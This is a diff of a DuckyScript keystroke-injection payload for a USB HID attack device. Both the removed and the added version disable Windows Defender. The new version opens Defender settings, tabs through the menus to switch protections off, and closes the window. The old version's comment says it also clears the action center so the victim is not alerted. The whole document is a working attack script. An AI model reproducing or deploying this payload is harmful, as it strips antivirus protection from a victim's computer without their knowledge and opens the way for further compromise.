@@ -1,30 +1,42 @@
 ```
-REM turn off windows defender then clear action center
-REM author:judge2020
-REM You take responsibility for any laws you break with this, I simply point out the security flaw
-REM
-REM start of script
-REM
-REM let the HID enumerate
+REM Disable windows defender
 DELAY 2000
-ESCAPE
-DELAY 100
-CONTROL ESCAPE
+GUI
 DELAY 100
 STRING Windows Defender Settings
 ENTER
-DELAY 2000
-REM why TAB and HOME?
-TAB
-DELAY 50
-REM why TAB and HOME?HOME
-DELAY 50
-ALT F4
-DELAY 3200
-REM windows + a = ????
-GUI a 
-DELAY 500
+DELAY 4000
+REM Navigate to "Manage" button
 ENTER
-DELAY 100
-GUI a
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 200
+TAB
+DELAY 2000
+REM Press the "Manage" button
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+LEFT
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+SPACE
+DELAY 1000
+TAB
+SPACE
+DELAY 1000
+TAB
+TAB
+SPACE
+DELAY 500
+REM close the window
+DELAY 500
+ALT F4
 ```
